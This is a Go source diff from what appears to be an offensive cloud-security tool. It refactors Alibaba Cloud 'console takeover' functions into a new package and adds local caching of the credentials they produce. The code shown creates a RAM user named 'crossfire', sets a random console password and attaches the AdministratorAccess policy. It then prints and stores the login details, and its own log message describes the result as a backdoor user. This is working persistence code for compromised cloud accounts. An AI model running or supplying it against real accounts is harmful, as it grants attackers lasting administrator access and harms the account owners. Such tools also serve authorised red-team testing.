@@ -1,11 +1,13 @@
-package aliram
+package aliconsole
 
 import (
 	"fmt"
 	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
 	log "github.com/sirupsen/logrus"
 	"github.com/teamssix/cf/pkg/cloud"
+	"github.com/teamssix/cf/pkg/cloud/alibaba/aliram"
 	"github.com/teamssix/cf/pkg/util"
+	"github.com/teamssix/cf/pkg/util/database"
 	"github.com/teamssix/cf/pkg/util/errutil"
 )
 
@@ -13,7 +15,7 @@ func CreateUser() {
 	request := ram.CreateCreateUserRequest()
 	request.Scheme = "https"
 	request.UserName = "crossfire"
-	_, err := RAMClient().CreateUser(request)
+	_, err := aliram.RAMClient().CreateUser(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
 		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
@@ -26,7 +28,7 @@ func CreateLoginProfile() string {
 	request.UserName = "crossfire"
 	randomPasswords := util.GenerateRandomPasswords()
 	request.Password = randomPasswords
-	_, err := RAMClient().CreateLoginProfile(request)
+	_, err := aliram.RAMClient().CreateLoginProfile(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
 		log.Debugln("成功为 crossfire 用户创建控制台登录密码 (Successfully created console login password for crossfire user)")
@@ -40,7 +42,7 @@ func AttachPolicyToUser() {
 	request.PolicyType = "System"
 	request.PolicyName = "AdministratorAccess"
 	request.UserName = "crossfire"
-	_, err := RAMClient().AttachPolicyToUser(request)
+	_, err := aliram.RAMClient().AttachPolicyToUser(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
 		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
@@ -50,7 +52,7 @@ func AttachPolicyToUser() {
 func GetAccountAlias() string {
 	request := ram.CreateGetAccountAliasRequest()
 	request.Scheme = "https"
-	response, err := RAMClient().GetAccountAlias(request)
+	response, err := aliram.RAMClient().GetAccountAlias(request)
 	errutil.HandleErrNoExit(err)
 	accountAlias := response.AccountAlias
 	return accountAlias
@@ -58,15 +60,17 @@ func GetAccountAlias() string {
 
 func TakeoverConsole() {
 	CreateUser()
-	randomPasswords := CreateLoginProfile()
+	password := CreateLoginProfile()
 	AttachPolicyToUser()
 	accountAlias := GetAccountAlias()
-	username := fmt.Sprintf("crossfire@%s", accountAlias)
+	userName := fmt.Sprintf("crossfire@%s", accountAlias)
+	loginURL := "https://signin.aliyun.com"
 	data := [][]string{
-		{username, randomPasswords, "https://signin.aliyun.com"},
+		{userName, password, loginURL},
 	}
+	database.InsertTakeoverConsoleCache("alibaba", accountAlias, userName, password, loginURL)
 	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
 	var td = cloud.TableData{Header: header, Body: data}
-	cloud.PrintTable(td, "")
+	cloud.PrintTable(td, "控制台接管信息")
 	log.Infoln("接管控制台成功，接管控制台会创建 crossfire 后门用户，如果想删除该后门用户，请执行 cf alibaba console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf alibaba console cancel.)")
 }
